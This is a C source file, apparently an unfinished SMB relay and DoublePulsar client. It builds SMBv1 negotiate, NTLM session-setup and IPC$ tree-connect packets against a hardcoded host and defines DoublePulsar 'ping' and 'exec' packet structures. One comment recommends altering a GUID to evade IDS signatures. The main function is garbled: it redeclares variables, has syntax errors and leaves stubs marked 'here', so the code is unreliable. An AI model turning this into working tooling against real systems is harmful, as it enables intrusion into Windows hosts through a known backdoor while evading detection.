#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#pragma comment(lib,"ws2_32.lib")
#pragma pack(1)


//from SMBrelay.h
#define SmbPacketLen(a) (SREV(a->SmbMessageLength)+4)

//from smb.h
#define SMBPACKETLEN(x) ((x->SmbMessageLength) +4 )
#define SmbLength(ptr) (((ptr)->buffer - (uint8*)(ptr)) + (ptr)->bufIndex)

#define WORD unsigned short



#define SMB_COM_OPEN                0x02
#define SMB_COM_TREE_CONNECT        0x70
#define SMB_COM_TREE_DISCONNECT     0x71
#define SMB_COM_NEGOTIATE           0x72
#define SMB_COM_SESSION_SETUP_ANDX  0x73
#define SMB_COM_LOGOFF_ANDX         0x74
#define SMB_COM_TREE_CONNECT_ANDX   0x75
#define SMB_COM_TRANSACTION2        0x32
#define SMB_COM_TRANSACTION2_SECONDARY 0x33
//SESSIONSETUPANDX Subcommands
#define CONTINUERESPONSE 1
#define ERRORRESPONSE	 2



typedef struct {
	uint16 SmbMessageType; //0x00
	uint16 SmbMessageLength; 
	uint8 ProtocolHeader[4]; //"\xffSMB"
	uint8 SmbCommand; 
	uint32 NtStatus; //0x00000000
	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16 flags2;  //0xC001 (Unicode & Nt error types & longfilename support
	uint16 ProcessIDHigh; //0x00
	uint8 signature[8]; //0x00000000000
	uint16 reserved; //0x0000
	uint16 TreeId; 
	uint16 ProccessID; //0xfeff
	uint16 UserID; 
	uint16 multipleID;  //Incremental 64bytes en cada request.
	char buffer[16384]; // Custom SmbCommand data
} smheader;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 

	uint16 MaxBuffer; 
	uint16 MaxMpxCount; 
	uint16 VcNumber; //0x0000
	uint32 SessionKey; //0x00000000
	uint16 SecurityBloblength; 
	uint32 reserved3; //0x00000000
	uint32 capabilities; //0x200000D4
	uint16 ByteCount; 
} SessionSetupAndX; 

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 
	uint16 Action;
	uint16 SecurityBloblength; 
	uint16 ByteCount;
//	uint8 padding;
} SessionSetupAndXResponse; 

/*
typedef struct {
	uint8 BufferFormat;
	char  Name[256];
} DIALECT;
*/
typedef struct {
	uint8 BufferFormat;
	char  *Name;
} DIALECT;


typedef struct {
	uint8 WordCount;
	uint16 ByteCount;
//	DIALECT *Dialects;
    char *Dialects;
} NegotiateProtocolRequest;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
    uint16 DialecIndex;
    uint8 SecurityMode;
    uint16 MaxMxpCount;
    uint16 MaxVcs;
    uint32 MaxBufferSize;
    uint32 MaxRawBuffer;
    uint32 SessionKey;
    uint32 Capabilities;
    //uint64 ServerTime;
    uint8  ServerTime[8];
    uint16 ServerTimeZone;
    uint8 KeyLength;
    uint16 ByteCount;
    uint8 ServerGuid[16];
} NegotiateProtocolResponse; 


typedef struct {
	uint8 WordCount; 
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset; 
	uint16 flags;
	uint16 PasswordLen;	//Set to 0x01
	uint16 ByteCount; 
	uint8 Password; //Set to 0x00
    //resource
    //service ????\0
} TreeConnectAndX; 

typedef struct {
	uint8 WordCount; 
	uint16 ByteCount; 
} TreeConnectAndXResponse;


typedef struct {
	uint8 WordCount; //0x24
	uint16 FID; //0xff no further command
	uint32 LastWrite;
	uint16 ByteCount;
} CLOSE;

typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount; 
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount; 
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
  uint8 parameters[12];
} SMB_COM_TRANS2_DOUBLEPULSAR_PING_STRUCT;

typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount; 
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount; 
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
  uint8 parameters[12];
  uint8 SMBData[4096];
} SMB_COM_TRANS2_DOUBLEPULSAR_EXEC_STRUCT;

//defines

//Build SMB Packet
smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 SubCommand, void *data, int DataSize);
//Tree Connect
int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, char *service);
//SMB Negotiation
char *AddDialect(char *data, char *name, uint8 type, int *PacketSize);


smheader *BuildSmbPacket1(void)
{
	char buf2[4096];
	smheader *SmbPacket1;
	memset((char*)buf2,'\0',sizeof(buf2));
	BuildAuthRequest((tSmbNtlmAuthRequest*)buf2,0,NULL,NULL);
#ifdef _DBG_
	DumpMem((char*)buf2,SmbLength((tSmbNtlmAuthRequest*)buf2));
#endif
	SmbPacket1=BuildSmbPacket((smheader*)NULL,SESSIONSETUPANDX,0,buf2,40);

	return(SmbPacket1);
}
/*********************************************/
smheader *GetSmbPacket2(RELAY *relay,smheader* Packet1)
{
	char *buffer=(char*)malloc(4096);
	int i;
    i=SendBytesAndWaitForResponse(relay->destination,(char*)Packet1, SmbPacketLen(Packet1), buffer,4096,SMBWAITTIMEOUT);
	if (i>0){
		return((smheader*)buffer);
	}
	return(NULL);
}
/*********************************************/
smheader *GetSmbPacket3(smheader* SmbPacket2,char *lpUserName, char *lpPassword,  char *domainname, char *host, tSmbNtlmAuthResponse* OptionalNtlmPacket3)
{
	char buf2[16384];
	smheader *SmbPacket3;
	memset((char*)buf2,'\0',sizeof(buf2));
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,lpUserName,lpPassword,domainname,host, OptionalNtlmPacket3);
    //DumpMem((void*)buf2,sizeof(tSmbNtlmAuthResponse));
	SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));
	return(SmbPacket3);
}


int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, char *service)
{
    TreeConnectAndX *message=(TreeConnectAndX*)destination;
    smheader *foo;
    message->WordCount=(uint16)4;
    message->AndXCommand=0xff;
    message->reserved2=0;    
    message->AndXOffset = sizeof(TreeConnectAndX) + strlen(password) + strlen(service)+1 + (strlen((char*)resource)+1)*sizeof(WCHAR) +          sizeof(smheader) - sizeof(foo->buffer) -4;
    message->flags=0x8;
    message->PasswordLen=strlen(password)+1;
    message->ByteCount = (strlen(resource)+1 )*sizeof(WCHAR) + message->PasswordLen +strlen(service)+1;
    memcpy((char*)&message->Password,password,message->PasswordLen);
    chartoWide((char*)&message->Password + message->PasswordLen,(char*)resource,(int)strlen((char*)resource) +1 );
    memcpy(destination+sizeof(TreeConnectAndX) + (strlen((char*)resource)+1)*sizeof(WCHAR) ,service,strlen(service)+1);//"\x3f\x3f\x3f\x3f\x3f\x00",6);
    
    return( sizeof(TreeConnectAndX) + strlen(password) + strlen(service)+1 + (strlen((char*)resource)+1)*sizeof(WCHAR) );

}

int SendBytesAndWaitForResponse(SOCKET destination,char *source, int nBytes, char *destinationBuffer, int MaxReadSize,int timeout)
{
	int i=-1;
	#ifdef WIN32
		u_long tmp=1;
	#else
		int tmp=1;
	#endif
	fd_set fds;
	struct timeval tv;

//    if (send(destination, source, nBytes,0) >0) {
		if (timeout>0) 
		{
			#ifdef WIN32
			ioctlsocket(destination, FIONBIO, &tmp);
			#else
			ioctl(destination, FIONBIO, (char *)&tmp);
			#endif
            send(destination, source, nBytes,0);
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&fds);
			FD_SET(destination, &fds);
            //printf("Esperando Timeout: %i\n",timeout);
            i=select((int)destination+1,&fds,0,0,&tv);
            //printf("saliendo select: %i\n",i);
			if (i<=0) return(-1);
        } else {
            send(destination, source, nBytes,0);
        }
		i=recv(destination, (char *)destinationBuffer, MaxReadSize, 0);
		if (timeout>0) 
		{
			tmp=0;
			#ifdef WIN32
			ioctlsocket(destination, FIONBIO, &tmp);
			#else
			ioctl(destination, FIONBIO, (char *)&tmp);
			#endif
		}

	return(i);
}

smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 SubCommand, void *data, int DataSize) 
{


	smheader *NewSmbPacket;
	WCHAR tail1[18];
	WCHAR tail2[17];

	//Parameters Supported:
	SessionSetupAndX *SessionSetupAndXMessage;
	SessionSetupAndXResponse *SessionSetupAndXResponseMessage; 
//	TreeConnectAndX  *TreeConnectAndXMessage;
	FIND_FIRST2		 *FIND_FIRST2Message;
	NTCreateAndX	 *NTCreateAndXMessage;
	WriteAndX		 *WriteAndXMessage;
	SMB_COM_TRANSACTION_STRUCT 	 *TransRequest;//
	ReadAndX		 *ReadAndXMessage;
	CLOSE			 *CloseMessage;

	//dce
	DceRpcBind		 *dcerpcbind;
//	CtxItem			 *ctx;
	DceRpcRequest	 *dcerpc;

	//other variables
	WCHAR lpFileNameW[256];
//	int		i,j;



	NewSmbPacket=(smheader*)malloc(sizeof(smheader));    
	memset((char*)NewSmbPacket,'\0',sizeof(smheader));
	NewSmbPacket->SmbMessageType=0x0000;

    //0xFF for SMBv1 and 0xFE for SMBv2 (TODO)
	memcpy((char*)NewSmbPacket->ProtocolHeader,"\xff\x53\x4d\x42",4); //"?SMB"
	NewSmbPacket->SmbCommand=SmbCommand;
	NewSmbPacket->flags=0x18;
    NewSmbPacket->flags2=0xc803; //LOWEST SMB FLAGS with Unicode
    //NewSmbPacket->flags2=0x4803;
//    NewSmbPacket->flags2=0xc802;

    NewSmbPacket->ProccessID=0xfeff;
	//NewSmbPacket->ProccessID=6666;
/*
	if (SmbCommand==SESSIONSETUPANDX) { //Init UserID value
		if (PreviousSmbMessage!=NULL)  {
			UserID=PreviousSmbMessage->UserID;
            printf("estableciendo UserID: %i\n",UserID);
		} 
	}
    */

	NewSmbPacket->UserID=UserID;
	NewSmbPacket->multipleID=MultpleID; 
	MultpleID+=64;


    if (DataSize > sizeof(NewSmbPacket->buffer)) {
        NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) + DataSize);

     }
	


	switch(SmbCommand)
	{

	case NEGOTIATEPROTOCOLREQUEST:
        UserID=0;
		MultpleID=0;
        if (SubCommand==CONTINUERESPONSE) {
            /*
                Generates an SMB Negotiate Protocol Response.
                This packet is needed when acting as an SMB Server.
                NOTE: If the original reponse from the client is sent, the server could force logoff due to kerberos authentication failure.
                 so we need to create our own packet with an unknown Computer GUID
            */
			NewSmbPacket->flags=0x98;
            NegotiateProtocolResponse *NegotiateProtocolResponseMessage;
		    NegotiateProtocolResponseMessage=(NegotiateProtocolResponse *)malloc(sizeof(NegotiateProtocolResponse));
		    memset((char*)NegotiateProtocolResponseMessage,'\0',sizeof(NegotiateProtocolResponse));
            NewSmbPacket->SmbMessageLength=SREV(85);
            NegotiateProtocolResponseMessage->WordCount=17;
            NegotiateProtocolResponseMessage->DialecIndex=5; //grater than lanman2.1
            NegotiateProtocolResponseMessage->SecurityMode=0x03; // User Security Mode + Password encrypted
            NegotiateProtocolResponseMessage->MaxMxpCount=50;
            NegotiateProtocolResponseMessage->MaxVcs=1;
            NegotiateProtocolResponseMessage->MaxBufferSize=16644;
            NegotiateProtocolResponseMessage->MaxRawBuffer=65536;
            NegotiateProtocolResponseMessage->SessionKey=0x00000000;
            NegotiateProtocolResponseMessage->Capabilities=0x8001f3fd;
            //FIX and set a valid ServerTime.
            //NegotiateProtocolResponseMessage->ServerTime=0; 
            NegotiateProtocolResponseMessage->ServerTimeZone=0x0000;
            NegotiateProtocolResponseMessage->KeyLength=0;
            NegotiateProtocolResponseMessage->ByteCount=16;
            //TODO: Generate Random SMBRELAY Server GUID.
            //change it to avoid IDS Signatures :)
            memcpy(NegotiateProtocolResponseMessage->ServerGuid,"\xef\xea\x7f\x5b\xe2\x0a\x4e\x4d\xad\xee\xa6\\x29\x15\\xab",16);
            memcpy(NewSmbPacket->buffer,(char*)NegotiateProtocolResponseMessage,sizeof(NegotiateProtocolResponse));
            free(NegotiateProtocolResponseMessage);

        } else {/* Generates an SMB Negotiate Protocol Response. This packet is needed when acting as an SMB Client.         */
            NegotiateProtocolRequest* NegotiateProtocolRequestMessage;
		    NegotiateProtocolRequestMessage=(NegotiateProtocolRequest *)malloc(sizeof(NegotiateProtocolRequest));
		    memset((char*)NegotiateProtocolRequestMessage,'\0',sizeof(NegotiateProtocolRequest));
		    NewSmbPacket->SmbMessageLength=SREV(35 + DataSize);
            if (DataSize > ( sizeof(NewSmbPacket->buffer) - sizeof(NegotiateProtocolRequest) + sizeof(DIALECT*) )) 
            {
                NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) -sizeof(NewSmbPacket->buffer) + sizeof(NegotiateProtocolRequest) +DataSize );

            }
		    NegotiateProtocolRequestMessage->WordCount=0;
            NegotiateProtocolRequestMessage->ByteCount=DataSize;
		    memcpy(NewSmbPacket->buffer,(char*)NegotiateProtocolRequestMessage,sizeof(NegotiateProtocolRequest)-sizeof(DIALECT*) );
            memcpy(NewSmbPacket->buffer + sizeof(NegotiateProtocolRequest)-sizeof(DIALECT*) ,data, DataSize);
            free(NegotiateProtocolRequestMessage);
        }
		break;






	case SMBCLOSE:
		CloseMessage=(CLOSE *)malloc(sizeof(CLOSE));
		memset((char*)CloseMessage,'\0',sizeof(CLOSE));
        
		NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(CLOSE)  -4 );

		CloseMessage->ByteCount=0;
		CloseMessage->WordCount=3;
		CloseMessage->LastWrite=0xFFFFFFFF;
		memcpy((char*)&CloseMessage->FID,(char*)data,2);
		memcpy(NewSmbPacket->buffer,(char*)CloseMessage,sizeof(CLOSE));	
        free(CloseMessage);
		break;


	case SESSIONSETUPANDX:
		if (SubCommand==ERRORRESPONSE) { 
			NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + 3  -4 );
			NewSmbPacket->NtStatus=0xc000006d;
			NewSmbPacket->UserID=PreviousSmbMessage->UserID;

		} else {
            if (PreviousSmbMessage!=NULL) NewSmbPacket->UserID = UserID =PreviousSmbMessage->UserID; //Init UserID parameter

			memset((char*)tail1,'\0',sizeof(tail1));
			memset((char*)tail2,'\0',sizeof(tail2));
			chartoWide((char*)tail1,"Windows 2000 2195",17);
			chartoWide((char*)tail2,"Windows 2000 5.0",16);

			if (SubCommand==CONTINUERESPONSE) {
				SessionSetupAndXResponseMessage=(SessionSetupAndXResponse *)malloc(sizeof(SessionSetupAndXResponse));
				memset((char*)SessionSetupAndXResponseMessage,'\0',sizeof(SessionSetupAndXResponse));
				//SessionSetupAndXResponse *SessionSetupAndXResponseMessage; 
				//NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2)  -4 );
                NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2)  -4 );                
				NewSmbPacket->NtStatus=0;
				//DumpMem((char*)&PreviousSmbMessage->UserID,0x30);
				//printf("El otro userID es: %i\n",PreviousSmbMessage->UserID);
				//memcpy((char*)&NewSmbPacket->UserID,(char*)&PreviousSmbMessage->UserID,2);
				NewSmbPacket->UserID=PreviousSmbMessage->UserID;
				SessionSetupAndXResponseMessage->WordCount=4;
				SessionSetupAndXResponseMessage->AndXCommand=0xff;
				SessionSetupAndXResponseMessage->AndXOffset=SREV(NewSmbPacket->SmbMessageLength);
				SessionSetupAndXResponseMessage->ByteCount=sizeof(tail1)+sizeof(tail2);
				memcpy(NewSmbPacket->buffer,(char*)SessionSetupAndXResponseMessage,sizeof(SessionSetupAndXResponse));
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndXResponse) +1,(char*)tail1,sizeof(tail1));
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndXResponse) +1 + sizeof(tail1) ,(char*)tail2,sizeof(tail2));
				//memcpy(NewSmbPacket->buffer,"\x00\x00\x00",3);	
                free(SessionSetupAndXResponseMessage);
			} else {
				SessionSetupAndXMessage=(SessionSetupAndX *)malloc(sizeof(SessionSetupAndX));
				memset((char*)SessionSetupAndXMessage,'\0',sizeof(SessionSetupAndX));
				NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SessionSetupAndX) + DataSize + 1 + sizeof(tail1) + sizeof(tail2) +2 -4 );
				//printf("packet len: %x\n",SREV(NewSmbPacket->SmbMessageLength));
                //printf("LEN: %x\n",NewSmbPacket->SmbMessageLength);
				SessionSetupAndXMessage->WordCount=12;
				SessionSetupAndXMessage->AndXCommand=0xff;
				SessionSetupAndXMessage->AndXOffset= SREV (NewSmbPacket->SmbMessageLength);//sizeof(smheader)-1024 +NtlmPacketLen + 1+ sizeof(tail1) + sizeof(tail2) +2 -4;

				SessionSetupAndXMessage->MaxBuffer=4356;//16644;
				SessionSetupAndXMessage->MaxMpxCount=10;
				SessionSetupAndXMessage->SecurityBloblength=DataSize; //Longitud del paquete NTLM
				SessionSetupAndXMessage->capabilities=0x800000d4; //0x200000D4;
				SessionSetupAndXMessage->ByteCount=(uint16) DataSize + 1 + sizeof(tail1) +sizeof(tail2) +2 ; //incluimos 2 nulls al final  y un byte antes de los wchars

				memcpy(NewSmbPacket->buffer,(char*)SessionSetupAndXMessage,sizeof(SessionSetupAndX));
				memcpy(NewSmbPacket->buffer+sizeof(SessionSetupAndX),(char*)data,DataSize);
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndX) + DataSize +1,(char*)tail1,sizeof(tail1));
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndX) + DataSize +1 + sizeof(tail1) ,(char*)tail2,sizeof(tail2));
                free(SessionSetupAndXMessage);
			}
            //free(SessionSetupAndXResponseMessage);
		}
		break;


	case TREECONNETANDX:
        if (SubCommand== STATUS_BAD_NETWORK_NAME ){
            NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(TreeConnectAndXResponse) -4 );
            NewSmbPacket->NtStatus=STATUS_BAD_NETWORK_NAME;
            memset(NewSmbPacket->buffer,'\0',3);
        } else {
            NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + DataSize -4); 
            memcpy(NewSmbPacket->buffer,data,DataSize);
        }
        break;



    case SMB_COM_CREATE_DIRECTORY:
    case SMB_COM_DELETE_DIRECTORY:
    case SMB_COM_OPEN:
    case SMB_COM_CREATE:
//    case SMB_COM_CLOSE:
    case SMB_COM_FLUSH:
    case SMB_COM_DELETE:
    case SMB_COM_RENAME:
    case SMB_COM_QUERY_INFORMATION:
    case SMB_COM_SET_INFORMATION:
    case SMB_COM_READ:
    case SMB_COM_WRITE:
    case SMB_COM_LOCK_BYTE_RANGE:
    case SMB_COM_UNLOCK_BYTE_RANGE:
    case SMB_COM_CREATE_TEMPORARY:
    case SMB_COM_CREATE_NEW:
    case SMB_COM_CHECK_DIRECTORY:
    case SMB_COM_PROCESS_EXIT:
    case SMB_COM_SEEK:
    case SMB_COM_LOCK_AND_READ:
    case SMB_COM_WRITE_AND_UNLOCK:
    case SMB_COM_READ_RAW:
    case SMB_COM_READ_MPX:
    case SMB_COM_READ_MPX_SECONDARY:
    case SMB_COM_WRITE_RAW:
    case SMB_COM_WRITE_MPX:
    case SMB_COM_WRITE_COMPLETE:
    case SMB_COM_SET_INFORMATION2:
    case SMB_COM_QUERY_INFORMATION2:
    case SMB_COM_LOCKING_ANDX:
//    case SMB_COM_TRANSACTION:
    case SMB_COM_TRANSACTION_SECONDARY:
    case SMB_COM_IOCTL:
    case SMB_COM_IOCTL_SECONDARY:
    case SMB_COM_COPY:
    case SMB_COM_MOVE:
    case SMB_COM_ECHO:
    case SMB_COM_WRITE_AND_CLOSE:
    case SMB_COM_OPEN_ANDX:
//    case SMB_COM_READ_ANDX:
//    case SMB_COM_WRITE_ANDX:
    case SMB_COM_CLOSE_AND_TREE_DISC:
//    case SMB_COM_TRANSACTION2:
    case SMB_COM_TRANSACTION2_SECONDARY:
    case SMB_COM_FIND_CLOSE2:
    case SMB_COM_FIND_NOTIFY_CLOSE:
    case SMB_COM_TREE_CONNECT:
    case SMB_COM_TREE_DISCONNECT:
   // case SMB_COM_NEGOTIATE:
   // case SMB_COM_SESSION_SETUP_ANDX:
    case SMB_COM_LOGOFF_ANDX:
//    case SMB_COM_TREE_CONNECT_ANDX:
    case SMB_COM_QUERY_INFORMATION_DISK:
    case SMB_COM_SEARCH:
    case SMB_COM_FIND:
    case SMB_COM_FIND_UNIQUE:
    case SMB_COM_NT_TRANSACT:
    case SMB_COM_NT_TRANSACT_SECONDARY:
//    case SMB_COM_NT_CREATE_ANDX:
    case SMB_COM_NT_CANCEL:
    case SMB_COM_OPEN_PRINT_FILE:
    case SMB_COM_WRITE_PRINT_FILE:
    case SMB_COM_CLOSE_PRINT_FILE:
    case SMB_COM_GET_PRINT_QUEUE:
    case SMB_COM_READ_BULK:
    case SMB_COM_WRITE_BULK:
   
     default:
         //printf("Unsupported SMB message\n");
         free(NewSmbPacket);
         return(NULL);
         break;
	}
	return(NewSmbPacket);
}

int main()
{
  unsigned char buf[4096];
	unsigned char buf2[4096];
	smheader *SmbPacket1,*SmbPacket2;
	smheader *errorpacket;
	smheader *NegotiateProtocol;
	smheader *NegotiateProtocolResponse;
  int i;	
  i=ConnectToRemoteHost(relay,destinationhostname,destinationport);
  if (!i) {
    printf("[-] Unable to connect to remote host\r");
  }
  printf("[+] Sending SMB Protocol Handshake against remote SMB Server...\n");
  char *p;
  p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);
  p = AddDialect(p,"LANMAN1.0", 0x02,&i);
	p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
	p = AddDialect(p,"LM1.2X002", 0x02,&i);
	p = AddDialect(p,"LANMAN2.1", 0x02,&i);
	p = AddDialect(p,"NT LM 0.12", 0x02,&i);
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
	free(p);
	i=SendBytesAndWaitForResponse(relay->destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(NegotiateProtocol);
  if (i<=0){
    printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed\n");
		return(0);
  }
  
  MultpleID=((smheader*)clientRequest)->multipleID;
  
  NegotiateProtocolResponse=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,CONTINUERESPONSE,NULL,0);
	send(relay->source,(char*)NegotiateProtocolResponse,SmbPacketLen(NegotiateProtocolResponse),0);
  
  OriginalUserID=SmbPacket2->UserID;
	MultpleID+=64;
	SmbPacket2->multipleID=MultpleID;
  
  int leido;
  
  leido=SendBytesAndWaitForResponse(relay->source,(char*)SmbPacket2, SmbPacketLen(SmbPacket2),(char*)clientRequest,sizeof(clientRequest),SMBWAITTIMEOUT);
  
  
  /* more functions that can be used */
  
  unsigned char buf[4096];
	smheader *SmbPacket1,*SmbPacket2,*SmbPacket3;
	smheader* NegotiateProtocol;
	int i;	
	char *p;

	printf("[+] Sending SMB Authentication Handshake                                    \r");
	p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);    
	p = AddDialect(p,"LANMAN1.0", 0x02,&i);
	p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
	p = AddDialect(p,"LM1.2X002", 0x02,&i);
	p = AddDialect(p,"LANMAN2.1", 0x02,&i);
	p = AddDialect(p,"NT LM 0.12", 0x02,&i);    
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
	free(p);
	i=SendBytesAndWaitForResponse(relay.destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(NegotiateProtocol);

	//i=InitSmbHandshake(&relay,(char*)buf,sizeof(buf));
	if (i<=0){
		printf("[+] Initial SMBHandShake (LanManager Negotiation) Failed                \n");
		return(0);
	}


SmbPacket3=GetSmbPacket3(SmbPacket2,lpUserName, lpPassword,NULL,lpSrcHostname,(tSmbNtlmAuthResponse*)NULL); //<- anonymous connection under windows 2000

i=SendBytesAndWaitForResponse(relay.destination,(char*)SmbPacket3, SmbPacketLen(SmbPacket3),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(SmbPacket3);
	//free(SmbPacket2);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response\n");
		return(0);
	}

if (((smheader*)buf)->NtStatus!=0x00000000) {
		printf("[-] SessionSetupAndX Completed                                            \n");
		printf("[-] Authentication against Remote Host Failed (Error: 0x%8.8X\n",((smheader*)buf)->NtStatus!=0x00000000);
		return(0);
	}

	if ( ((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001 )
	{
		printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");

		return(0);
	}

	//SetEnviroment(((smheader*)buf)->UserID,0,0);
  
  
  
  //TreeConnect
  unsigned char buf[4096];
  char target[] = "192.168.0.8";
  sprintf(path,"\\\\%s\\IPC$",target);
	i=BuildTreeConnectAndXStub((char*)buf,"",path,"?????");
	packet=BuildSmbPacket((smheader*)NULL,TREECONNETANDX,0,buf,i);

i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to connect to IPC$\n");
		return(0);
	}



i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to bind to SCM pipe                             \n");
		return(0);
	}
  
  //Find the value of OPENSERVICEW and change it for the appropriate value for a trans2 packet
  packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANS2,OPENSERVICEW,data,len);
	//((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
  
  
  
  //Build Doublepulsar Ping packet here
  ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
	MultpleID=0x41;
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID=->MultpleID;
  
  
  
  
  
  //Build Doublepulsar EXEC packet here
  ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
	MultpleID=0x42;
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID=->MultpleID;
  
  return 0;
}



